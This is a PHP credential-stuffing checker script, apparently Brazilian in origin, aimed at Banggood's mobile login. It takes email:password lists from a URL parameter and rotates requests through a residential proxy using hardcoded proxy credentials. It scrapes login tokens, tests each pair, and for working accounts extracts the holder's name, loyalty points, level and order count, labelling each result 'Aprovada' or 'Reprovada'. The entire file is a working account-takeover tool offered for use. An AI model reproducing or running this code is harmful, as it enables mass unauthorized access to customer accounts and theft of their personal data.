<?php

$username = 'lum-customer-hl_13bb8f26-zone-static-route_err-pass_dyn';
$password = 'jnfuvljd9j5';
$port = 22225;

$super_proxy = 'zproxy.lum-superproxy.io';
error_reporting(0);


if (file_exists(getcwd() . '/cookie.txt')) {
  unlink(getcwd() . '/cookie.txt');
}
function multiexplode($delimiters, $string) {
	$one = str_replace($delimiters, $delimiters[0], $string);
	$two = explode($delimiters[0], $one);
	return $two;
}
$lista = $_GET['lista'];

$email = multiexplode(array(":", "|", ""), $lista)[0];
$senha  = multiexplode(array(":", "|", ""), $lista)[1];

function getStr($string, $start, $end) {
	$str = explode($start, $string);
	$str = explode($end, $str[1]);
	return $str[0];
}

$ch = curl_init ('https://m.banggood.com/login.html');
$session = mt_rand();
curl_setopt($ch, CURLOPT_PROXY, "http://zproxy.lum-superproxy.io:22225");
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "lum-customer-hl_13bb8f26-zone-static-route_err-pass_dyn-country-br-session-$session:jnfuvljd9j5");
curl_setopt ($ch,CURLOPT_RETURNTRANSFER,1);
curl_setopt ($ch,CURLOPT_FOLLOWLOCATION,1);
curl_setopt ($ch,CURLOPT_USERAGENT, $_SERVER ['HTTP_USER_AGENT']);
curl_setopt ($ch,CURLOPT_HTTPHEADER,arraY (
'Host: m.banggood.com',
'cache-control: max-age=0',
'upgrade-insecure-requests: 1',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
'accept-encoding: gzip, deflate, br',
'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7'

));
curl_setopt ($ch,CURLOPT_COOKIEJAR,getcwd() . '/cookie.txt');
curl_setopt ($ch,CURLOPT_COOKIEFILE,getcwd() . '/cookie.txt');
curl_setopt ($ch,CURLOPT_ENCODING,'gzip');
curl_setopt ($ch,CURLOPT_SSL_VERIFYPEER,0);
curl_setopt ($ch,CURLOPT_SSL_VERIFYHOST,0);
$site = curl_exec ($ch);

$token1 = getstr ($site,"var rand_code = '","';");

$ch = curl_init ('https://m.banggood.com/index.php?com=login&t=generateToken&c=api');
curl_setopt ($ch,CURLOPT_RETURNTRANSFER,1);
curl_setopt ($ch,CURLOPT_FOLLOWLOCATION,1);
curl_setopt ($ch,CURLOPT_USERAGENT, $_SERVER ['HTTP_USER_AGENT']);
curl_setopt ($ch,CURLOPT_HTTPHEADER,arraY (
''
));
curl_setopt ($ch,CURLOPT_COOKIEJAR,getcwd() . '/cookie.txt');
curl_setopt ($ch,CURLOPT_COOKIEFILE,getcwd() . '/cookie.txt');
curl_setopt ($ch,CURLOPT_ENCODING,'gzip');
curl_setopt ($ch,CURLOPT_SSL_VERIFYPEER,0);
curl_setopt ($ch,CURLOPT_SSL_VERIFYHOST,0);
curl_setopt($ch,CURLOPT_POSTFIELDS,'rand_code='.$token1);
$site2 = curl_exec ($ch);

$token2 = getstr ($site2,'"result":"','"');


$ch = curl_init ('https://m.banggood.com/index.php?com=login&t=login&c=api');

//curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-country-br-session-$session:$password");

curl_setopt ($ch,CURLOPT_RETURNTRANSFER,1);
curl_setopt ($ch,CURLOPT_FOLLOWLOCATION,1);

curl_setopt ($ch,CURLOPT_HTTPHEADER,arraY (
'Host: m.banggood.com',

'accept: application/json',
'origin: https://m.banggood.com',
'x-requested-with: XMLHttpRequest',
'user-agent: Mozilla/5.0 (Linux; Android 6.0.1; SM-G600FY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36',
'content-type: application/x-www-form-urlencoded',
'referer: https://m.banggood.com/login.html',
'accept-encoding: gzip, deflate, br',
'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7'
));
curl_setopt ($ch,CURLOPT_ENCODING,'gzip');
curl_setopt ($ch,CURLOPT_SSL_VERIFYPEER,0);
curl_setopt ($ch,CURLOPT_SSL_VERIFYHOST,0);
curl_setopt($ch,CURLOPT_POSTFIELDS,'rand_code='. $token1.'&login_token='. $token2.'&email='. $email.'&password='. $senha.'');
curl_setopt ($ch,CURLOPT_COOKIEJAR,getcwd() . '/cookie.txt');
curl_setopt ($ch,CURLOPT_COOKIEFILE,getcwd() . '/cookie.txt');
$entra = curl_exec ($ch);

$get = getstr ($entra,'"result":"','"');

if (strpos ($get,'Logined successfully')!==false){
    $ch = curl_init ('https://m.banggood.com/index.php?com=customer');
    
	//curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
//	curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-country-br-session-$session:$password");
	 curl_setopt ($ch,CURLOPT_RETURNTRANSFER,1);
    curl_setopt ($ch,CURLOPT_FOLLOWLOCATION,1);
    curl_setopt ($ch,CURLOPT_HTTPHEADER,arraY (
    'Host: m.banggood.com',
    'user-agent: Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G600FY Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36',
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'referer: https://m.banggood.com/login.html',
    'accept-encoding: gzip, deflate, br',
    'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7'
    ));
    curl_setopt ($ch,CURLOPT_COOKIEJAR,getcwd() . '/cookie.txt');
    curl_setopt ($ch,CURLOPT_COOKIEFILE,getcwd() . '/cookie.txt');
    curl_setopt ($ch,CURLOPT_ENCODING,'gzip');
    curl_setopt ($ch,CURLOPT_SSL_VERIFYPEER,0);
    curl_setopt ($ch,CURLOPT_SSL_VERIFYHOST,0);
    $as = curl_exec ($ch);
   

    if (strpos ($as,'My Orders')!==false){
         $ch = curl_init ('https://m.banggood.com/index.php?com=customer&t=userData&c=api');
         //curl_setopt($ch, CURLOPT_PROXY, 'http://zproxy.lum-superproxy.io:22225');
         //curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'lum-customer-hl_0429bc3b-zone-static:6ra2tc6ydjh4');
        curl_setopt ($ch,CURLOPT_RETURNTRANSFER,1);
        curl_setopt ($ch,CURLOPT_FOLLOWLOCATION,1);
        curl_setopt ($ch,CURLOPT_HTTPHEADER,arraY (
         ));
         curl_setopt ($ch,CURLOPT_COOKIEJAR,getcwd() . '/cookie.txt');
        curl_setopt ($ch,CURLOPT_COOKIEFILE,getcwd() . '/cookie.txt');
        curl_setopt ($ch,CURLOPT_ENCODING,'gzip');
        curl_setopt ($ch,CURLOPT_SSL_VERIFYPEER,0);
        curl_setopt ($ch,CURLOPT_SSL_VERIFYHOST,0);
        $Dados= curl_exec ($ch);
        $nome = getstr ($Dados,'"name":"','"');
        $nu_p = getstr ($Dados,'"orders_num":',',');
        $pontos = getstr ($Dados,'"points_num":',',');
        $nivel = getstr ($Dados,'"next_level":',',');


        echo"<br><span style='background: linear-gradient(to right, rgb(244, 238, 66) 0%, rgb(220, 244, 66)0%, rgb(66, 244, 235) 100%);, color: black; padding: 6px 5px; border-radius: 4px; font-size: 10px; font-weight: 600;'>Aprovada</span><span style='color:white'>  EMAIL: $email  SENHA:$senha </span><span class='label label-info' style='color: white'> Informações [ Nome: $nome | Pontos: $pontos | Nivel: $nivel | Total De Pedidos: $nu_p ]</span> <span style='background: linear-gradient(to right, rgb(244, 238, 66) 0%, rgb(220, 244, 66)0%, rgb(66, 244, 235) 100%);, whiteolor: white; padding: 4px 5px; border-radius: 2px; font-size: 10px; font-weight: 600;'>@CentralShadow</span>";
}
}else {
   //EDITA TUA MENSAGEM DE DIE
  echo "<span style ='background-color:red; color: black; padding: 4px 5px; border-radius: 2px; font-size: 10px; font-weight: 600'>Reprovada</span> <span style='color:red;'> EMAIL: $email SENHA:$senha  Retorno: Email ou senha incorreto</span>";
  xflush();

}
xflush();

?>